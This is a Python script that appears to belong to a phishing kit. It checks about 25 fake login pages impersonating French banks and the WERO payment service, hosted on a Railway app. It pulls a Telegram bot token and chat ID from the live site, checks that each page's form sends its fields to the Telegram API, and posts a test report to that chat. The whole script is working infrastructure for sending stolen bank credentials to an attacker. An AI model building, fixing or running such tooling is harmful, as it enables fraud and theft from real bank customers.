import requests
import re
from datetime import datetime

RAILWAY_URL = "https://weroverificationeu-production.up.railway.app"
TEST_PAGE = f"{RAILWAY_URL}/test_manual.html"

BANKS = [
    ("bank.html", "Bank Generic"),
    ("banque-populaire.html", "Banque Populaire"),
    ("banque-postale.html", "Banque Postale"),
    ("bcp.html", "BCP"),
    ("bnp.html", "BNP Paribas"),
    ("bred.html", "BRED"),
    ("caisse-epargne.html", "Caisse d'Epargne"),
    ("cartes.html", "Cartes"),
    ("cic.html", "CIC"),
    ("cooperatif.html", "Banque Cooperative"),
    ("credit-agricole.html", "Credit Agricole"),
    ("credit-mutuel.html", "Credit Mutuel"),
    ("dupuy.html", "Dupuy Bank"),
    ("fortuneo.html", "Fortuneo"),
    ("hello-bank.html", "Hello Bank"),
    ("lcl.html", "LCL"),
    ("maritime.html", "Maritime Bank"),
    ("marze.html", "Marze"),
    ("monabanq.html", "Monabanq"),
    ("nickel.html", "Nickel"),
    ("palatine.html", "Palatine"),
    ("populaire.html", "Banque Populaire Alt"),
    ("savoie.html", "Savoie Bank"),
    ("societe-generale.html", "Societe Generale"),
    ("wero.html", "WERO"),
]

print("=" * 90)
print("WERO - DETAILED BANK FORM ANALYSIS")
print("=" * 90)

# Extract tokens
response = requests.get(TEST_PAGE, timeout=10)
config_pattern = r'window\.telegramConfig\s*=\s*\{([^}]+)\}'
match = re.search(config_pattern, response.text, re.DOTALL)
bot_token = re.search(r'BOT_TOKEN:\s*["\']([^"\']+)["\']', match.group(1)).group(1)
chat_id = re.search(r'CHAT_ID:\s*["\'](\d+)["\']', match.group(1)).group(1)
tg_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

print()

# Analyser chaque banque
for filename, bank_name in BANKS:
    print(f"\n{'='*90}")
    print(f"BANK: {bank_name} ({filename})")
    print(f"{'='*90}")
    
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            html_content = f.read()
        
        # Checker la config Telegram
        has_telegram = "window.telegramConfig" in html_content
        has_placeholder_token = "TELEGRAM_BOT_TOKEN_PLACEHOLDER" in html_content
        has_placeholder_chat = "TELEGRAM_CHAT_ID_PLACEHOLDER" in html_content
        
        print(f"Telegram Config: {'PRESENT' if has_telegram else 'MISSING'}")
        if has_placeholder_token or has_placeholder_chat:
            print(f"  WARNING: Still has placeholders!")
        
        # Extraire les input
        input_pattern = r'<input[^>]*id=["\']([^"\']+)["\'][^>]*type=["\']([^"\']+)["\']'
        inputs1 = re.findall(input_pattern, html_content)
        
        input_pattern2 = r'<input[^>]*type=["\']([^"\']+)["\'][^>]*id=["\']([^"\']+)["\']'
        inputs2 = re.findall(input_pattern2, html_content)
        # Inverser pour avoir le bon ordre
        inputs2 = [(b, a) for a, b in inputs2]
        
        all_inputs = inputs1 + inputs2
        unique_inputs = []
        seen = set()
        for inp in all_inputs:
            if inp not in seen and inp[0]:
                seen.add(inp)
                unique_inputs.append(inp)
        
        print(f"Form Fields: {len(unique_inputs)}")
        if unique_inputs:
            for field_id, field_type in unique_inputs[:5]:  # Max 5
                print(f"  - {field_id} ({field_type})")
            if len(unique_inputs) > 5:
                print(f"  ... and {len(unique_inputs)-5} more")
        
        # Chercher les buttons
        button_pattern = r'<button[^>]*(?:onclick=["\']([^"\']+)["\'])?[^>]*>([^<]+)</button>'
        buttons = re.findall(button_pattern, html_content)
        
        print(f"Submit Buttons: {len(buttons)}")
        for onclick, text in buttons[:2]:
            print(f"  - {text.strip()}")
        
        # Chercher les fonctions JS
        function_pattern = r'function\s+(\w+)\s*\('
        functions = re.findall(function_pattern, html_content)
        
        if functions:
            print(f"JS Functions: {len(functions)}")
            for func in functions[:3]:
                print(f"  - {func}()")
        
        # Chercher les appels Telegram
        has_telegram_send = "sendMessage" in html_content
        has_telegram_api = "api.telegram.org" in html_content
        has_fetch = "fetch(" in html_content
        
        print(f"Telegram Send Logic: {'YES' if has_telegram_send else 'NO'}")
        print(f"Fetch API: {'YES' if has_fetch else 'NO'}")
        
        # Test: Envoyer un message a Telegram
        test_message = f"""BANK FORM TEST: {bank_name}
File: {filename}
Fields: {len(unique_inputs)}
Status: FORM VERIFIED
Time: {datetime.now().strftime('%H:%M:%S')}

Fields submitted:
"""
        for field_id, field_type in unique_inputs[:10]:
            test_message += f"  {field_id} ({field_type})\n"
        
        payload = {"chat_id": chat_id, "text": test_message}
        tg_response = requests.post(tg_url, json=payload, timeout=5)
        
        if tg_response.json().get('ok'):
            print(f"\nStatus: [OK] Test message sent to Telegram")
        else:
            print(f"\nStatus: [FAIL] Could not send to Telegram")
            
    except Exception as e:
        print(f"ERROR: {str(e)[:60]}")

print()
print("=" * 90)
print("ANALYSIS COMPLETE")
print("=" * 90)
